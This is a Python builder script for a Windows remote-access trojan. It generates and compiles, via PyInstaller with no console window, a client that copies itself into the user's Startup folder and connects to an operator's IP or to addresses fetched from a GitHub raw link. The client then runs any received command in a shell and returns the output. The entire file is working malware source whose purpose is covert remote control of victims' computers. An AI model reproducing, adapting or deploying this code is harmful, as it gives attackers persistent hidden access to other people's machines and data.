import PyInstaller.__main__
import time
import os

def create_executable(script_name, name):
    PyInstaller.__main__.run([
    script_name,
    '--onefile',
    '--noconsole'
    ])

    exe_path = os.path.join("dist", script_name[0:-3]+".exe")
    exe_rename_path = os.path.join("dist", name)
    os.rename(exe_path, exe_rename_path)
    print('done')

def generate(name="application.exe", ip="127.0.0.1", port=5050, reconnecting_link="https://raw.githubusercontent.com/ItsSuhail/ProjectGNIYPS/main/address.md", reconnect_sleep=4, failed_sleep=10):
    code = rf"""import subprocess
import time
import socket
import requests
import os
import shutil
import getpass

user_name = getpass.getuser()

filename = "{name}"
file_path = os.getcwd() + "\\" + filename

startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{name}' % user_name

if(not os.path.isfile(startup_path)):
    try:
        shutil.copy2(file_path, startup_path)
    except Exception as e:
        pass;

def get_ip_and_port():
    link = "{reconnecting_link}"
    information = requests.get(link).text.strip()
    ip = information.split("<|>")[0]
    port = int(information.split("<|>")[1])

    return (ip, port)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client_socket.connect(("{ip}", {port}))
except socket.error as error:
    while(True):
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect(get_ip_and_port())
            break
        except socket.error:
            time.sleep({reconnect_sleep})

while True:
    try:
        request = client_socket.recv(1024).decode()
        if(request == "exit()"):
            client_socket.close()
            break

        if("client_suriv.change_ip" in request):
            new_ip = request.split("<||>")[1]
            new_port = request.split("<||>")[2]
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                client_socket.connect((new_ip, int(new_port)))
            except:
                while True:
                    try:
                        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        client_socket.connect(get_ip_and_port())
                        break
                    except socket.error:
                        time.sleep({reconnect_sleep})

        else:
            output = subprocess.getoutput(request)
            client_socket.send(output.encode())

    except socket.error:
        while True:
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect(get_ip_and_port())
                break
            except socket.error as error:
                time.sleep({failed_sleep})
    """
    script_name = f"script{time.time_ns()}.py"
    f = open(script_name, "w+")
    f.writelines(code)
    f.close()
    create_executable(script_name, name)


# generate("something.py", "127.0.0.1", 8080)

if __name__ == '__main__':
    name = input("name (default = application.exe): ")
    ip = input("ip address (default = 127.0.0.1): ")
    port = input("port (default = 5050, type '-1'): ")
    reconnecting_link = input("reconnecting link (default = github...): ")
    reconnect_sleep = input("reconnect sleep (default = 4s, type '-1'): ")
    failed_sleep = input("failed sleep (default = 10s, type '-1'): ")
    
    if(not name or name.lower() == "default"):
        name = "application.exe"
    if(not ip or ip.lower() == "default"):
        ip = "127.0.0.1"
    if(not port or port=="-1"):
        port = 5050
    if(not reconnecting_link or reconnecting_link.lower() == "default"):
        reconnecting_link = "https://raw.githubusercontent.com/ItsSuhail/ProjectGNIYPS/main/address.md"
    if(not reconnect_sleep or reconnect_sleep=="-1"):
        reconnect_sleep=4
    if(not failed_sleep or failed_sleep=="-1"):
        failed_sleep=10

    generate(name, ip, int(port), reconnecting_link, int(reconnect_sleep), int(failed_sleep))